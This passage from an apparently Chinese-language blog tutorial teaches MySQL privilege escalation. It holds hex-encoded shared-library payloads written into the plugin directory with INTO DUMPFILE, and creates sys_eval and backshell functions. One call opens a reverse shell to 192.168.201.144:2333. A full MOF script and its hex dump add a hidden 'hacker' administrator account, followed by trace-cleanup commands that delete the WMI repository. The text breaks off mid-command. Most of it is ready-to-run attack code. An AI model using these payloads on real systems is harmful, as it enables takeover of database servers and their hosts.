00000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000 INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf32.so&#x27;;</span><br></pre></td></tr></table></figure><h4 id="lib-mysqludf-sys-64-so"><a href="#lib-mysqludf-sys-64-so" class="headerlink" title="lib_mysqludf_sys_64.so"></a>lib_mysqludf_sys_64.so</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 0x7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c000000000000000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d00000026000000170000000000000000040000000000000051e57464060000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000002500800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000 INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf64.so&#x27;;</span><br></pre></td></tr></table></figure><h3 id="创建自定义函数并调用命令"><a href="#创建自定义函数并调用命令" class="headerlink" title="创建自定义函数并调用命令"></a>创建自定义函数并调用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;</span><br></pre></td></tr></table></figure><p>可能会出现下面的报错：</p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020111041041.png" alt="image-20211020111041041" style="zoom:150%;" /><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1126 (HY000): Can&#x27;t open shared library &#x27;udf1.dll&#x27; (errno: 193 )</span><br></pre></td></tr></table></figure><p>因为 lib_mysqludf_sys_64.dll 失败，最后使用 lib_mysqludf_sys_32.dll 才成功，所以这里的 dll 应该和系统位数无关，可能和 MySQL 的安装版本有关系，而 PHPStudy 自带的 MySQL 版本是 32 位的</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020111552648.png" alt="image-20211020111552648"></p><p>导入成功后查看一下 mysql 函数里面是否新增了 sys_eval：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020112417755.png" alt="image-20211020112417755"></p><p>这里的 sys_eval 支持自定义，接着就可以通过创建的这个函数来执行系统命令了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;whoami&#x27;);</span><br></pre></td></tr></table></figure><blockquote><p>如果在 Windows 系统下的话应该就是最高权限了，执行一些 net user 增加用户的命令应该都是可以成功的</p></blockquote><h3 id="删除自定义函数"><a href="#删除自定义函数" class="headerlink" title="删除自定义函数"></a>删除自定义函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">&gt;</span> <span class="keyword">drop</span> <span class="keyword">function</span> sys_eval;</span><br></pre></td></tr></table></figure><h2 id="UDF-PHP"><a href="#UDF-PHP" class="headerlink" title="UDF.PHP"></a>UDF.PHP</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020114906003.png" alt="image-20211020114906003"></p><h2 id="Navicat-MySQL"><a href="#Navicat-MySQL" class="headerlink" title="Navicat MySQL"></a>Navicat MySQL</h2><p>navicat安装目录下自带tunnel 隧道脚本</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020115213273.png" alt="image-20211020115213273"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020124709803.png" alt="image-20211020124709803"></p><p>使用php脚本建立http连接</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028104034319.png" alt="image-20211028104034319"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211020125405937.png" alt="image-20211020125405937"></p><h2 id="反弹shell提权"><a href="#反弹shell提权" class="headerlink" title="反弹shell提权"></a>反弹shell提权</h2><p><a href="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/document/langouster_udf.zip">https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/document/langouster_udf.zip</a></p><h3 id="使用SQL语句执行cmd创建功能函数"><a href="#使用SQL语句执行cmd创建功能函数" class="headerlink" title="使用SQL语句执行cmd创建功能函数"></a>使用SQL语句执行cmd创建功能函数</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028134405581.png" alt="image-20211028134405581"></p><blockquote><p>注意创建的函数要是下面列表中存在的</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmdshell 执行cmd;</span><br><span class="line">downloader 下载者,到网上下载指定文件并保存到指定目录;</span><br><span class="line">open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</span><br><span class="line">backshell 反弹Shell;</span><br><span class="line">ProcessView 枚举系统进程;</span><br><span class="line">KillProcess 终止指定进程;</span><br><span class="line">regread 读注册表;</span><br><span class="line">regwrite 写注册表;</span><br><span class="line">shut 关机,注销,重启;</span><br><span class="line">about 说明与帮助函数;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028135012856.png" alt="image-20211028135012856"></p><h3 id="创建反弹shell的函数"><a href="#创建反弹shell的函数" class="headerlink" title="创建反弹shell的函数"></a>创建反弹shell的函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> backshell <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028140540898.png" alt="image-20211028140540898"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> backshell(&quot;192.168.201.144&quot;, <span class="number">2333</span>)</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028140623641.png" alt="image-20211028140623641"></p><p>消除乱码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><h1 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h1><p>MOF 提权是一个有历史的漏洞，基本上在 Windows Server 2003 的环境下才可以成功。提权的原理是<code>C:/Windows/system32/wbem/mof/</code>目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p><h2 id="在winser2003部署mysql"><a href="#在winser2003部署mysql" class="headerlink" title="在winser2003部署mysql"></a>在winser2003部署mysql</h2><p>确定服务器32位</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028145310492.png" alt="image-20211028145310492"></p><blockquote><ol><li>系统类型为X86-based PC就是32位</li><li>系统类型为X64-based PC就是64位</li></ol></blockquote><p><a href="https://downloads.mysql.com/archives/community/">下载mysql</a></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028145441831.png" alt="image-20211028145441831"></p><h2 id="手动复现"><a href="#手动复现" class="headerlink" title="手动复现"></a>手动复现</h2><h3 id="上传-mof-文件执行命令"><a href="#上传-mof-文件执行命令" class="headerlink" title="上传 mof 文件执行命令"></a>上传 mof 文件执行命令</h3><p>mof 脚本的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;; </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hacker P@ssw0rd /add\&quot;)\nWSH.run(\&quot;net.exe localgroup administrators hacker /add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>核心payload为：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var WSH = <span class="keyword">new</span> ActiveXObject(\<span class="string">&quot;WScript.Shell\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe user hacker P@ssw0rd /add\&quot;</span>)\nWSH.run(\<span class="string">&quot;net.exe localgroup administrators hacker /add\&quot;</span>)</span><br></pre></td></tr></table></figure><p>MySQL 写文件的特性将这个 MOF 文件导入到 <code>C:/Windows/system32/wbem/mof/</code> 目录下，依然采用上述编码的方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;</span><br></pre></td></tr></table></figure><p>执行成功的的时候，test.mof 会出现在：<code>C:\WINDOWS\system32\wbem\mof\good</code> 目录下 否则出现在 <code>C:\WINDOWS\system32\wbem\mof\bad</code> 目录下：</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028151547142.png" alt="image-20211028151547142"></p><p>核心payload中的账号已经生成</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211028151834628.png" alt="image-20211028151834628"></p><h3 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><p>因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 停止 winmgmt 服务</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 Repository 文件夹</span></span><br><span class="line">rmdir /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动删除 mof 文件</span></span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除创建的用户</span></span><br><span class="line">net user 